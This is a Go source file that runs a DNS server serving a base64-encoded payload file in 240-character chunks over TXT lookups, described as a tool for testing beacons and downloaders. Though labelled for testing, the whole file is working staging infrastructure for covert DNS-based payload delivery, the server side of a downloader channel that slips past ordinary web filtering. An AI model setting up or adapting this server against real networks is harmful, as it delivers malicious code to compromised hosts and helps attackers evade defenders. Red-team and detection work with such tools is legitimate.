// Implement a basic DNS server for testing beacons and downloaders. This should
// not be used in production.
package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"strconv"

	"github.com/miekg/dns"
)

const payloadFile = "payload.bin"
const payloadDns = "ns.domain.com"  // The payload server DNS address.
const domain = "domain.com"
const port = ":5553"

var chunks map[string]string

// Base64 encode our payload and break it into 240 character chunks to be sent
// over TXT lookups. Store the chunks in a map with the chunk count as the index.
//
// This excellent idea is courtesy of @breenmachine https://github.com/breenmachine/dnsftp
func chunk(data []byte) {
	str := base64.StdEncoding.EncodeToString(data)
	size := 240
	count := (len(str) / size) + 1

	for i := 0; i < count; i++ {
		iStr := strconv.Itoa(i)
		begin := i * size
		end := begin + size

		if end > len(str) {
			end = len(str)
		}

		chunks[iStr] = str[begin:end]
	}
}

// Define a DNS server handler.
type handler struct{}

// ServeDNS will respond to the NS and TXT requests necessary for testing the
// DNS beacon and downloader.
func (this *handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := dns.Msg{}
	name := r.Question[0].Name
	recType := r.Question[0].Qtype

	msg.SetReply(r)

	log.Printf("%s request for %s\n", dns.TypeToString[recType], name)

	switch r.Question[0].Qtype {
	case dns.TypeSOA:
		rr, err := dns.NewRR(fmt.Sprintf("%s 300 SOA %s %s 2015013001 86400 7200 604800 300", name, name, payloadDns))
		if err != nil {
			log.Println(err)
			return
		}

		msg.Answer = append(msg.Answer, rr)

	case dns.TypeMX:
		rr, err := dns.NewRR(fmt.Sprintf("%s MX 10 %s", name, payloadDns))
		if err != nil {
			log.Println(err)
			return
		}

		msg.Answer = append(msg.Answer, rr)

	case dns.TypeNS:
		rr, err := dns.NewRR(fmt.Sprintf("%s NS %s", name, payloadDns))
		if err != nil {
			log.Println(err)
			return
		}

		msg.Answer = append(msg.Answer, rr)

	case dns.TypeTXT:
		if _, ok := dns.IsDomainName(name); !ok {
			log.Println("Invalid domain name")
			return
		}

		key := dns.SplitDomainName(name)[0]
		val, ok := chunks[key]
		if !ok {
			val = ""
		}

		rr, err := dns.NewRR(fmt.Sprintf("%s TXT %s", r.Question[0].Name, val))
		if err != nil {
			log.Println(err)
			return
		}

		msg.Answer = append(msg.Answer, rr)
	}

	w.WriteMsg(&msg)
}

func main() {
	chunks = make(map[string]string)

	// Open our payload file and chunk it.
	data, err := ioutil.ReadFile(payloadFile)
	if err != nil {
		log.Print("Failed to read payload.")
	} else {
		chunk(data)
	}

	// Start our DNS server.
	srv := &dns.Server{Addr: port, Net: "udp"}
	srv.Handler = &handler{}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("Failed to set udp listener %s\n", err.Error())
	}
}
